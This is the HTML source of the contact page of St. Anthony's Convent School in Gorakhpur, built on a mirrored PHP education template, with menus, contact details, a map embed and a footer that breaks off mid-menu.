<!DOCTYPE>
<html>
<!-- Mirrored from php.themewant.com/unipix/index-two.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 08 May 2025 07:44:43 GMT -->
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>St. Anthony’s Convent School</title>
    <link rel="shortcut icon" type="image/x-icon" href="assets/images/logo/emblem%201.jpg">
    <!-- animate css -->
    <link rel="stylesheet" href="assets/css/plugins/animate.min.css">
    <!-- fontawesome 6.4.2 -->
    <link rel="stylesheet" href="assets/css/plugins/fontawesome.min.css">
    <!-- bootstrap min css -->
    <link rel="stylesheet" href="assets/css/vendor/bootstrap.min.css">
    <!-- swiper Css 10.2.0 -->
    <link rel="stylesheet" href="assets/css/plugins/swiper.min.css">
    <!-- Bootstrap 5.0.2 -->
    <link rel="stylesheet" href="assets/css/vendor/magnific-popup.css">
    <!-- metismenu scss -->
    <link rel="stylesheet" href="assets/css/vendor/metismenu.css">
    <!-- nice select js -->
    <link rel="stylesheet" href="assets/css/plugins/nice-select.css">
    <link rel="stylesheet" href="assets/css/plugins/jquery-ui.css">
    <!-- custom style css -->
    <link rel="stylesheet" href="assets/css/style.css">
    <link href="assets/css/flexslider.css" rel="stylesheet" />

</head>

<body>
    <!-- Top Contact Bar -->
    <div class="top-bar">
        <div class="top-bar-container">
            <div class="contact-details">
                📞 <a href="tel:+919876543210">0551-228 0250</a> &nbsp; | &nbsp;
                📧 <a href="mailto:stanthony100@gmail.com">stanthony100@gmail.com</a>
               <span style="padding-left:12px;">Affiliation Number- 2131306</span>
            </div>
            <div class="social-icons">
                <a href="https://www.facebook.com/share/16NQD98XaQ/" target="_blank"><i class="fab fa-facebook-f"></i></a>
                <a href="#" target="_blank"><i class="fab fa-instagram"></i></a>
                <a href="https://youtube.com/@stanthonyconvent5802" target="_blank"><i class="fab fa-youtube"></i></a>
                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
            </div>
        </div>
    </div>
    <!-- header area start -->
    <header class="header header__sticky v__2">
        <div class="container-fluid header11topDown">
            <div class="row">
                <div class="col-xl-12">
                    <div class="header__wrapper">
                        <div class="header__logo d-flex align-items-center">
                            <a href="index.php" class="d-flex align-items-center text-decoration-none">
                                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                                <div class="school-name text-dark">
                                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>

                        <div class="header__menu">
                            <div class="navigation">
                                <nav class="navigation__menu">
                                    <ul>
                                        <li class="navigation__menu--item has-child">
                                            <a href="index.php" class="navigation__menu--item__link">Home</a>
                                             
                                        </li> 
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">About Us</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                                                                <li><a href="principal.php">Principal Desk </a></li>
                                            </ul>
                                        </li>

                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Curriculam</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                                                                            </ul>
                                        </li>
                                        
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="javascript:void(0);" class="navigation__menu--item__link">Facilities</a>
                                            <ul class="submenu sub__style">
                                                                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                                                                            </ul>
                                        </li>

                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Achievements</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="toppers-x.php">Toppers X</a></li>
                                                <li><a href="toppers-xii.php">Toppers XII</a></li>
                                            </ul>
                                        </li>

                                         
                                        <li class="navigation__menu--item has-child has-arrow">
                                            <a href="#" class="navigation__menu--item__link">Gallery</a>
                                            <ul class="submenu sub__style">
                                                <li><a href="event_gallery.php">Event Gallery</a></li>
                                                <!--<li><a href="menu/VideoGallery/Default.php">Video Gallery</a></li>-->
                                            </ul>
                                        </li>
                                         <li class="navigation__menu--item has-child">
                                            <a href="tc.php" class="navigation__menu--item__link">Tc</a>
                                             
                                        </li> 

                                        <li class="navigation__menu--item">
                                            <a href="contact.php" class="navigation__menu--item__link">Contact</a>
                                        </li>
                                    </ul>
                                </nav>
                            </div>
                        </div>
                        <div class="header__right">
                            <div class="header__right--item">
                                <div id="menu-btn" class="menu__trigger">
                                    <i class="fa-solid fa-bars"></i>
                                    <!--<img src="assets/images/icon/menu__bar.svg" alt="bar">-->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>




     



    <!-- BREADCRUMB AREA -->
    <section class="rts-breadcrumb breadcrumb-height breadcumb-bg" style="background-image: url(assets/images/banner/2.jpeg);">
        <div class="container">
            <div class="row">
                <div class="col-12">
                    <div class="breadcrumb-content">
                        <ul class="breadcrumb">
                            <li class="breadcrumb-item"><a href="index.php">Home</a></li>
                            <li class="breadcrumb-item active" aria-current="page">Contact</li>
                        </ul>
                        <h2 class="section-title">Contact Us</h2>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- BREADCRUMB AREA END -->


    <!-- rts contact info -->
    <section class="rts-contact-info rts-section-padding">
        <div class="container">
            <div class="row">
                <div class="rts-section rt-center mb--40">
                    <h2 class="rts__section--title text-capitalize">General Contact Information</h2>
                </div>
            </div>
            <div class="contact-information">
                <div class="row justify-content-md-start  justify-content-sm-center g-5">
                    <div class="col-lg-4 col-md-6 col-sm-10">
                        <div class="single-contact">
                            <div class="single-contact__single">
                                <div class="icon">
                                    <i class="fa-thin fa-map-location-dot"></i>
                                </div>
                                <p class="--p-m">
                                    Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012
                                </p>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6 col-sm-10">
                        <div class="single-contact">
                            <div class="single-contact__single">
                                <div class="icon">
                                    <i class="fa-thin fa-phone"></i>
                                </div>
                                <div class="method">
                                    <a href="callto:+0551-228 0250" class="phone">0551-228 0250</a>
                                    <!--<a href="callto:+442041542542" class="phone">+44 20 4154 2542</a>-->
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-lg-4 col-md-6 col-sm-10">
                        <div class="single-contact">
                            <div class="single-contact__single">
                                <div class="icon">
                                    <svg width="64" height="64" viewBox="0 0 47 39" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path d="M32.6538 24.6879C32.4741 24.6888 32.2998 24.6257 32.1622 24.5101L26.44 19.8758C26.35 19.8013 26.2776 19.7077 26.2279 19.602C26.1782 19.4962 26.1524 19.3808 26.1523 19.2639V6.44918C26.1523 6.2411 26.235 6.04154 26.3821 5.89441C26.5293 5.74727 26.7288 5.66461 26.9369 5.66461C27.145 5.66461 27.3446 5.74727 27.4917 5.89441C27.6388 6.04154 27.7215 6.2411 27.7215 6.44918V18.8925L33.1507 23.2913C33.2799 23.3947 33.3731 23.5362 33.417 23.6956C33.4609 23.8551 33.4534 24.0243 33.3954 24.1792C33.3374 24.3341 33.2319 24.4667 33.094 24.558C32.9561 24.6494 32.7929 24.6948 32.6277 24.6879H32.6538Z" fill="#890C25"></path>
                                        <path d="M19.0586 27.8315H10.308C10.0999 27.8315 9.90037 27.7488 9.75323 27.6017C9.6061 27.4546 9.52344 27.255 9.52344 27.0469C9.52344 26.8389 9.6061 26.6393 9.75323 26.4922C9.90037 26.345 10.0999 26.2624 10.308 26.2624H19.0586C19.2667 26.2624 19.4663 26.345 19.6134 26.4922C19.7605 26.6393 19.8432 26.8389 19.8432 27.0469C19.8432 27.255 19.7605 27.4546 19.6134 27.6017C19.4663 27.7488 19.2667 27.8315 19.0586 27.8315Z" fill="#890C25"></path>
                                        <path d="M15.5084 19.4104H0.784573C0.576491 19.4104 0.376932 19.3278 0.229796 19.1806C0.0826602 19.0335 0 18.8339 0 18.6259C0 18.4178 0.0826602 18.2182 0.229796 18.0711C0.376932 17.9239 0.576491 17.8413 0.784573 17.8413H15.5084C15.7165 17.8413 15.916 17.9239 16.0632 18.0711C16.2103 18.2182 16.293 18.4178 16.293 18.6259C16.293 18.8339 16.2103 19.0335 16.0632 19.1806C15.916 19.3278 15.7165 19.4104 15.5084 19.4104Z" fill="#890C25"></path>
                                        <path d="M9.90568 10.8952H4.6752C4.46712 10.8952 4.26756 10.8125 4.12042 10.6654C3.97329 10.5183 3.89063 10.3187 3.89062 10.1106C3.89062 9.90254 3.97329 9.70298 4.12042 9.55585C4.26756 9.40871 4.46712 9.32605 4.6752 9.32605H9.90568C10.1138 9.32605 10.3133 9.40871 10.4605 9.55585C10.6076 9.70298 10.6903 9.90254 10.6903 10.1106C10.6903 10.3187 10.6076 10.5183 10.4605 10.6654C10.3133 10.8125 10.1138 10.8952 9.90568 10.8952Z" fill="#890C25"></path>
                                        <path d="M26.9369 34.1707C26.7288 34.1707 26.5293 34.088 26.3821 33.9409C26.235 33.7938 26.1523 33.5942 26.1523 33.3861V33.2292C26.1523 33.0211 26.235 32.8216 26.3821 32.6744C26.5293 32.5273 26.7288 32.4446 26.9369 32.4446C27.145 32.4446 27.3446 32.5273 27.4917 32.6744C27.6388 32.8216 27.7215 33.0211 27.7215 33.2292V33.3861C27.7215 33.5942 27.6388 33.7938 27.4917 33.9409C27.3446 34.088 27.145 34.1707 26.9369 34.1707Z" fill="#890C25"></path>
                                        <path d="M41.5548 20.0483H41.3979C41.1898 20.0483 40.9902 19.9656 40.8431 19.8185C40.6959 19.6714 40.6133 19.4718 40.6133 19.2637C40.6133 19.0556 40.6959 18.8561 40.8431 18.709C40.9902 18.5618 41.1898 18.4792 41.3979 18.4792H41.5548C41.7629 18.4792 41.9624 18.5618 42.1095 18.709C42.2567 18.8561 42.3393 19.0556 42.3393 19.2637C42.3393 19.4718 42.2567 19.6714 42.1095 19.8185C41.9624 19.9656 41.7629 20.0483 41.5548 20.0483Z" fill="#890C25"></path>
                                        <path d="M8.64242 22.5903C8.45353 22.5908 8.27091 22.5226 8.12852 22.3985C7.98613 22.2744 7.89366 22.1028 7.8683 21.9156C7.74767 21.0369 7.68998 20.1507 7.6957 19.2637C7.6957 19.0556 7.77836 18.8561 7.9255 18.709C8.07263 18.5618 8.27219 18.4792 8.48027 18.4792C8.68835 18.4792 8.88791 18.5618 9.03505 18.709C9.18218 18.8561 9.26484 19.0556 9.26484 19.2637C9.26493 20.0773 9.32086 20.89 9.43222 21.6959C9.4461 21.7995 9.43916 21.9047 9.41181 22.0056C9.38445 22.1064 9.33723 22.2008 9.27292 22.2831C9.20861 22.3654 9.1285 22.4341 9.0373 22.4851C8.94609 22.536 8.84563 22.5682 8.7418 22.5799L8.64242 22.5903Z" fill="#890C25"></path>
                                        <path d="M26.9368 38.5173C24.3491 38.5264 21.7866 38.0095 19.4048 36.998C17.023 35.9865 14.8716 34.5014 13.0812 32.633C12.9619 32.4795 12.9037 32.2872 12.9181 32.0933C12.9325 31.8994 13.0183 31.7177 13.1591 31.5835C13.2998 31.4493 13.4853 31.3722 13.6797 31.367C13.874 31.3618 14.0634 31.429 14.211 31.5555C15.8556 33.2705 17.8318 34.6329 20.0196 35.56C22.2073 36.4871 24.5608 36.9594 26.9368 36.9482C30.0888 36.9473 33.1832 36.104 35.8998 34.5056C38.6164 32.9071 40.8564 30.6117 42.388 27.8569C43.9196 25.102 44.687 21.9879 44.6109 18.8369C44.5348 15.6858 43.6179 12.6124 41.9551 9.93471C40.2923 7.25703 37.9441 5.07242 35.1535 3.60703C32.3629 2.14163 29.2314 1.44871 26.083 1.59999C22.9347 1.75127 19.884 2.74126 17.2468 4.46747C14.6095 6.19368 12.4816 8.59338 11.0832 11.4182C10.9903 11.6047 10.827 11.7468 10.6294 11.813C10.4317 11.8792 10.2158 11.8642 10.0293 11.7712C9.84268 11.6783 9.70066 11.515 9.63445 11.3174C9.56824 11.1197 9.58326 10.9038 9.6762 10.7173C11.1987 7.64042 13.5161 5.02648 16.3882 3.14607C19.2603 1.26567 22.5829 0.187174 26.0119 0.022243C29.4409 -0.142688 32.8516 0.611944 35.891 2.20801C38.9303 3.80407 41.4878 6.18354 43.2986 9.10006C45.1095 12.0166 46.1078 15.3641 46.1902 18.7961C46.2727 22.228 45.4363 25.6196 43.7676 28.6198C42.099 31.6199 39.6587 34.1194 36.6995 35.8596C33.7403 37.5998 30.3698 38.5174 26.9368 38.5173Z" fill="#890C25"></path>
                                        <path d="M5.88828 27.8315H4.46035C4.25227 27.8315 4.05271 27.7488 3.90558 27.6017C3.75844 27.4546 3.67578 27.255 3.67578 27.0469C3.67578 26.8389 3.75844 26.6393 3.90558 26.4922C4.05271 26.345 4.25227 26.2624 4.46035 26.2624H5.88828C6.09636 26.2624 6.29592 26.345 6.44305 26.4922C6.59019 26.6393 6.67285 26.8389 6.67285 27.0469C6.67285 27.255 6.59019 27.4546 6.44305 27.6017C6.29592 27.7488 6.09636 27.8315 5.88828 27.8315Z" fill="#890C25"></path>
                                        <path d="M9.35872 14.1277C9.22661 14.1262 9.097 14.0915 8.98175 14.0269C8.86651 13.9624 8.76931 13.8699 8.69905 13.758C8.6288 13.6461 8.58773 13.5184 8.57962 13.3865C8.5715 13.2546 8.59659 13.1228 8.6526 13.0032L9.74054 10.7279C9.78484 10.6349 9.84705 10.5514 9.92359 10.4824C10.0001 10.4134 10.0895 10.3601 10.1867 10.3256C10.2838 10.2911 10.3868 10.2761 10.4897 10.2814C10.5927 10.2867 10.6936 10.3123 10.7866 10.3566C10.8797 10.4009 10.9631 10.4631 11.0322 10.5396C11.1012 10.6162 11.1545 10.7056 11.189 10.8027C11.2235 10.8998 11.2385 11.0028 11.2332 11.1058C11.2278 11.2087 11.2023 11.3096 11.158 11.4027L10.0701 13.6832C10.0052 13.8166 9.9041 13.9291 9.77829 14.0077C9.65248 14.0863 9.50707 14.1279 9.35872 14.1277Z" fill="#890C25"></path>
                                    </svg>
                                </div>
                                <p class="--p-l rt-regular">
                                    Mon-Fri: 9 AM – 6 PM <br>
                                    Saturday: 9 AM – 4 PM
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!-- rts contact info end -->


    <!-- other contact method -->
    <div class="rts-campus-contact pb--120">
        <div class="container">
            <!--<div class="row">-->
            <!--    <div class="rts-seciton rt-center mb--40">-->
            <!--        <h2 class="rts__section--title text-capitalize">Other Campus Contacts</h2>-->
            <!--    </div>-->
            <!--</div>-->
            <!--<div class="contact-method">-->
            <!--    <div class="row justify-content-md-start justify-content-sm-center g-5">-->
            <!--        <div class="col-lg-4 col-md-6 col-sm-10">-->
            <!--            <div class="contact-method__single">-->
            <!--                <div class="contact-img-bg">-->
            <!--                    <img src="assets/images/contact/01.jpg" alt="">-->
            <!--                </div>-->
            <!--                <div class="contact-text">-->
            <!--                    <h3 class="contact-title">London</h3>-->
            <!--                    <p class="description">University of London, 15 Talbot Square, Tyburnia, London W2 1TT, UK</p>-->
            <!--                    <div class="contact-link">-->
            <!--                        <a href="callto:+442078628360">+44 20 7862 8360</a>-->
            <!--                        <a href="mailto:Unipix.info@edu">Unipix.info@edu</a>-->
            <!--                    </div>-->
            <!--                </div>-->
            <!--            </div>-->
            <!--        </div>-->
            <!--        <div class="col-lg-4 col-md-6 col-sm-10">-->
            <!--            <div class="contact-method__single">-->
            <!--                <div class="contact-img-bg">-->
            <!--                    <img src="assets/images/contact/02.jpg" alt="">-->
            <!--                </div>-->
            <!--                <div class="contact-text">-->
            <!--                    <h3 class="contact-title">New York</h3>-->
            <!--                    <p class="description">80 Washington Square E, New York, NY 10003, USA</p>-->
            <!--                    <div class="contact-link">-->
            <!--                        <a href="callto:+442078628360">+44 20 7862 8360</a>-->
            <!--                        <a href="mailto:Unipix.info@edu">Unipix.info@edu</a>-->
            <!--                    </div>-->
            <!--                </div>-->
            <!--            </div>-->
            <!--        </div>-->
            <!--        <div class="col-lg-4 col-md-6 col-sm-10">-->
            <!--            <div class="contact-method__single">-->
            <!--                <div class="contact-img-bg">-->
            <!--                    <img src="assets/images/contact/03.jpg" alt="">-->
            <!--                </div>-->
            <!--                <div class="contact-text">-->
            <!--                    <h3 class="contact-title">Boston</h3>-->
            <!--                    <p class="description">Center for Computing & Data Sciences, 665 Commonwealth Ave, Boston, MA 02215, USA</p>-->
            <!--                    <div class="contact-link">-->
            <!--                        <a href="callto:+442078628360">+44 20 7862 8360</a>-->
            <!--                        <a href="mailto:Unipix.info@edu">Unipix.info@edu</a>-->
            <!--                    </div>-->
            <!--                </div>-->
            <!--            </div>-->
            <!--        </div>-->
            <!--    </div>-->
            <!--</div>-->
            <div class="contact-map mt--30">
               <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3562.2031483731294!2d83.3853939!3d26.769793599999996!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x399144f6e8e5dacd%3A0x6b862e7bd8949c6d!2sSt.%20Anthony&#39;s%20Convent%20School!5e0!3m2!1sen!2sin!4v1754668033227!5m2!1sen!2sin" width="600" height="450" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
            </div>
        </div>
    </div>
    <!-- other contact method end -->
   

<!-- footer start -->
    <footer class="rts-footer rts-footer-padding v_2">
        <div class="container">
            <div class="row justify-content-center">
                <div class="rts-footer-newsletter">
                    <div class="col-lg-10">
                        <div class="rts-newsletter-box-content">
                            <h4 class="newsletter-title">Subscribe To Newsletter
                            </h4>
                            <div class="newsletter-form w-530">
                                <form action="#">
                                    <input type="email" name="subscription" id="subscription" placeholder="Enter Your mail" required="">
                                    <button type="submit" class="rts-nbg-btn btn-arrow">Subscribe <span><i class="fa-sharp fa-regular fa-arrow-right"></i></span></button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="row gy-5 gy-lg-0">
                <div class="col-lg-4 col-md-6 col-sm-6">
                    <div class="rts-footer-widget w-320">
                        <div class="header__logo" style="display: flex; align-items: center;">
                            <a href="index.php" style="display: flex; align-items: center; text-decoration: none;">
                                <img src="assets/images/logo/emblem 1.png"
                                    alt="St. Anthony’s Convent School Logo"
                                    height="80" width="80"
                                    style="border-radius: 50%; object-fit: cover; margin-right: 10px; border: 2px solid #ccc;">
                                
                                <div style="color: #000;">
                                    <h5 style="margin: 0; font-weight: bold; font-size: 18px; line-height: 1.2;color:white">
                                        St. Anthony’s Convent School
                                    </h5>
                                    <small style="font-size: 13px; color: #6c757d;">Gorakhpur • Serve in Love</small>
                                </div>
                            </a>
                        </div>


                        <p>
                            We are passionate education dedicated to providing high-quality
                            resources learners all backgrounds.
                        </p>
                        <div class="rts-contact-link">
                            <a href="mailto:stanthony100@gmail.com"><i class="fa-sharp fa-light fa-location-dot"></i> Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                            <a href="callto:0551-228 0250"><i class="fa-thin fa-phone"></i> 0551-228 0250</a>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-6">
                    <div class="rts-footer-widget ">
                        <h6 class="rt-semi">Important Links</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Privacy Policy</a></li>
                                <li><a href="#">Terms & Conditions</a></li>
                                <li><a href="#">Sitemap</a></li>
                                <li><a href="#"> Blogs</a></li>
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 col-md-6 col-sm-4">
                    <div class="rts-footer-widget ml--30">
                        <h6 class="rt-semi">About Us</h6>
                        <div class="rts-footer-menu">
                            <ul>
                                <li><a href="#">Our History </a></li>
                                <li><a href="About.php">About Us</a></li>
                                <li><a href="#">St. Anthony</a></li>
                                <li><a href="#">Our Mission</a></li>
                                <li><a href="#">Our Vision</a></li>
                                 <li><a href="#">Our Motto</a></li>
                                <li><a href="#">School Anthem</a></li>
                               
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-6 col-sm-8">
                    <div class="rts-footer-widget ml--30">
                        
                                </li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="rts-footer-copy-right v_1">
        <div class="container">
            <div class="row">
                <div class="rt-center">
                    <p class="--p-xs">Copyright &copy; <span id="year"></span> All Rights Reserved by <a href="#">St. Anthony’s Convent School</a></p>
                </div>
            </div>
        </div>
    </div>
    <!-- footer end -->
    <!-- offcanvase menu -->
    <!-- header style two -->
    <div id="side-bar" class="side-bar">
        <button class="close-icon-menu"><i class="far fa-times"></i></button>
        <!-- inner menu area desktop start -->
        <div class="inner-main-wrapper-desk">
            <div class="thumbnail">
                
               <a href="index.php" class="d-flex align-items-center text-decoration-none">
                <img src="assets/images/logo/emblem 1.png" height="80" width="80" alt="St. Anthony’s Convent School Logo" class="me-2" style="object-fit: contain;    padding-left: 9px;width:23%;">
                <div class="school-name text-dark">
                    <h5 class="mb-0 fw-bold" style="font-size: 18px; line-height: 1.2;">St. Anthony’s Convent School</h5>
                    <small class="text-muted" style="font-size: 13px;">Gorakhpur • Serve in Love</small>
                </div>
            </a>
            </div>
            <div class="inner-content">
                <p class="disc">
                    A modern php template for education, offering intuitive design & essential features for seamless learning experiences.
                </p>
                <!-- offcanvase banner -->
                <div class="offcanvase__banner mt--50">
                    <div class="offcanvase__banner--content">
                        <img src="assets/images/offcanvase.jpg" alt="offcanvase">
                        <a href="admission.php" class="rts-theme-btn">Apply Now</a>
                    </div>
                </div>
                <div class="offcanvase__info">
                    <div class="offcanvase__info--content">
                        <a href="callto:+0551-228 0250"><span><i class="fa-sharp fa-light fa-phone"></i></span>0551-228 0250</a>
                        <a href="#"><span><i class="fa-sharp fa-light fa-location-dot"></i></span>Railway Dairy Colony, Gorakhpur, Uttar Pradesh 273012</a>
                        <div class="offcanvase__info--content--social">
                            <p class="title">Follow Us:</p>
                            <div class="social__links">
                                <a href="https://www.facebook.com/share/16NQD98XaQ/"><i class="fa-brands fa-facebook"></i></a>
                                <a href="#"><i class="fa-brands fa-instagram"></i></a>
                                <a href="https://wa.me/+918303547194" target="_blank"><i class="fab fa-whatsapp"></i></a>
                                <a href="https://youtube.com/@stanthonyconvent5802"><i class="fa-brands fa-youtube"></i></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- mobile menu area start -->
        <div class="mobile-menu-main">
            <nav class="nav-main mainmenu-nav mt--30">
            <ul class="mainmenu metismenu" id="mobile-menu-active">
                <li>
                    <a href="index.php" class="main">Home</a>
                </li>
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">About Us</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=about-us">About Us</a></li>
                                                    <li><a href="content.php?slug=objectives">Objectives</a></li>
                                                 <li>
                            <a href="principal.php" class="main">Principal Desk</a>
                        </li>
                    </ul>
                </li>
                
                <!-- Curriculum - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Curriculum</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=fees-structure">Fees Structure</a></li>
                                                    <li><a href="content.php?slug=admission-details">Admission Details</a></li>
                                                    <li><a href="content.php?slug=attendance-and-absence">Attendance And Absence</a></li>
                                                    <li><a href="content.php?slug=holidays">Holidays</a></li>
                                                    <li><a href="content.php?slug=behaviour-discipline-policy">Behaviour/Discipline Policy</a></li>
                                                    <li><a href="content.php?slug=co-curricular-activities">Co-Curricular Activities</a></li>
                                                    <li><a href="content.php?slug=school-timings">School Timings</a></li>
                                                    <li><a href="content.php?slug=fee-structure">TEACHING STAFF</a></li>
                                                    <li><a href="content.php?slug=the-curriculum">The Curriculum</a></li>
                                                    <li><a href="content.php?slug=general-information">General Information</a></li>
                                                    <li><a href="content.php?slug=academic-calander">ACADEMIC  CALANDER</a></li>
                                                    <li><a href="content.php?slug=parent-teacher-association">PARENT-TEACHER ASSOCIATION</a></li>
                                                    <li><a href="content.php?slug=copies-of-valid-water-health-and-sanitation-certificates">WATER, HEALTH AND SANITATION CERTIFICATES</a></li>
                                                    <li><a href="content.php?slug=result-of-last-five-years">RESULT OF LAST FIVE YEARS</a></li>
                                                    <li><a href="content.php?slug=no-objection-certificate-noc-by-the-state-govt-up">NO OBJECTION CERTIFICATE (NOC) BY THE STATE GOVT./UP</a></li>
                                                    <li><a href="content.php?slug=societies-trust-company-registration-renewal-certificate">SOCIETIES/TRUST/COMPANY REGISTRATION/RENEWAL CERTIFICATE</a></li>
                                                    <li><a href="content.php?slug=affiliation-upgradation-letter-and-recent-extension-of-affiliation">AFFILIATION/UPGRADATION LETTER AND RECENT EXTENSION OF AFFILIATION</a></li>
                                                    <li><a href="content.php?slug=school-infrasturcture">SCHOOL INFRASTURCTURE</a></li>
                                                    <li><a href="content.php?slug=the-deo-certificate-submitted-by-the-school-for-affiliation-upgradation-extension-of-affiliation-or-self-certification-by-school">THE DEO CERTIFICATE SUBMITTED BY THE SCHOOL FOR AFFILIATION/UPGRADATION/EXTENSION OF AFFILIATION OR SELF CERTIFICATION BY SCHOOL</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-building-safety-certificate-as-per-the-national-building-code-">COPY OF VALID BUILDING SAFETY CERTIFICATE AS PER THE NATIONAL BUILDING CODE*</a></li>
                                                    <li><a href="content.php?slug=copy-of-valid-fire-safety-certificate-issued-by-the-competent-authority-">COPY OF VALID FIRE SAFETY CERTIFICATE ISSUED BY THE COMPETENT AUTHORITY*</a></li>
                                                    <li><a href="content.php?slug=list-of-school-management-committee-smc-">LIST OF SCHOOL MANAGEMENT COMMITTEE (SMC)</a></li>
                                            </ul>
                </li>
                
                <!-- Facilities - Dynamic -->
                <li class="has-droupdown">
                    <a href="javascript:void(0);" class="main">Facilities</a>
                    <ul class="submenu mm-collapse">
                                                    <li><a href="content.php?slug=library">Library</a></li>
                                                    <li><a href="content.php?slug=parents-teachers-interaction">Parents/Teachers Interaction</a></li>
                                                    <li><a href="content.php?slug=computer-lab">COMPUTER LAB</a></li>
                                                    <li><a href="content.php?slug=physics-lab">PHYSICS LAB</a></li>
                                                    <li><a href="content.php?slug=biology-lab">BIOLOGY LAB</a></li>
                                                    <li><a href="content.php?slug=chemistry-lab">CHEMISTRY LAB</a></li>
                                            </ul>
                </li>

                <li class="has-droupdown">
